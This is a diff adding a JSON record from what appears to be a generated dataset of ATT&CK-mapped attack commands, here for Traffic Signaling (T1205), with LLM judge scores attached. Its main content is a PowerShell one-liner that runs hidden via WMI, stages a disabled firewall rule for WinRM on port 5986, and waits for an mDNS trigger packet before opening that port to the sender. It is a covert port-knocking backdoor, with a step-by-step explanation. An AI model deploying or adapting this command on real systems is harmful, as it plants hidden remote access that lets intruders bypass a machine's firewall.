@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Enabled False }; $u=New-Object System.Net.Sockets.UdpClient(5353); $ep=New-Object System.Net.IPEndPoint([System.Net.IPAddress]::Any,0); while($true){ $d=$u.Receive([ref]$ep); $s=[Text.Encoding]::ASCII.GetString($d); if($s -like ''*._wpad._tcp.local*'' -and $s -like ''*open=1*''){ Set-NetFirewallRule -DisplayName ''Signal-Open-WinRM-mDNS'' -Enabled True -RemoteAddress $ep.Address; break } } }'",
+  "explanation": "Watches mDNS on UDP/5353 and looks for a query/record referencing '_wpad._tcp.local' with a TXT-like token 'open=1'. This application-specific signal enables a WinRM HTTPS (5986) firewall rule for the requester.",
+  "rationale_steps": [
+    "Create disabled inbound rule for TCP/5986.",
+    "Listen on UDP/5353 and inspect the payload for mDNS service and TXT token.",
+    "On match, enable the firewall rule and limit to signaling source."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-5411a282-ce27b7f5",
+  "source_prompt_hash": "5411a282",
+  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Balanced quoting/braces and valid PowerShell/WMI parameters; the New-Object, UDP receive, and firewall cmdlets are syntactically well-formed within the single-quoted command string.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually fits Traffic Signaling by awaiting an mDNS-based trigger to enable a WinRM rule, but it likely fails operationally without admin rights, proper multicast group join/binding for mDNS, and performs naive ASCII matching on binary DNS data.",
+        "combined_score": 4.0,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T14:54:35.385614Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes, parentheses, braces, and correct use of command separators and valid flags for all PowerShell cmdlets and WMI invocation.",
+        "semantic_score": 3,
+        "semantic_justification": "The command effectively implements traffic signaling using mDNS and the logic for firewall rule manipulation is correct; however, the stated 'Privilege: None' is insufficient for creating or modifying firewall rules, making the intended outcome of enabling WinRM inaccessible under the described conditions.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T14:55:03.863724Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
